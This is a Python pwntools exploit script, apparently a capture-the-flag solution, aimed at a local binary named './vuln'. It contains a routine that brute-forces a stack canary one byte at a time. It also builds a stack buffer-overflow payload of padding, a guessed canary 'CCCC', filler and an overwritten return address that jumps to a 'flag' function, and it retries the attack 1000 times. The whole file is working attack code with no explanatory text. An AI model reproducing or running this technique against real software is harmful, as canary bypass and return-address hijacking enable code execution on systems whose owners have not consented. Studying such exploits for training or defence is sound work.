#!/usr/bin/env python

from pwn import *

context.log_level = 'error'

def canary_brute():
	result = ""
	for i in range(4):
		for k in range(256):
			r = process('./vuln')

			r.sendlineafter('> ', str(33+i))

			test = 'A'*32+result+chr(k)

			r.sendlineafter('> ', test)
			out = r.recvline()
			r.close()
			if 'Now' in out:
				result+=chr(k)
				break
			

	return u32(result)

def exploit():

	#canary = 0x48366137
	canary = 'CCCC'
	#load
	p = process('./vuln')
	e = ELF('./vuln')

	#addr
	flag = 0x565557ed
	#send length of entry
	p.sendlineafter('> ', '56')

	offset = 32

	#payload
	payload = ''
	payload+= 'A'*offset
	payload+= canary
	payload+= 'B'*16
	payload+= p32(flag)
	p.sendlineafter('Input> ', payload)

	print p.recv()

	p.close()

if __name__ == '__main__':
	#canary = canary_brute()
	#log.info("Canary Found        " + hex(canary))
	
	for i in range(1000):
		exploit()

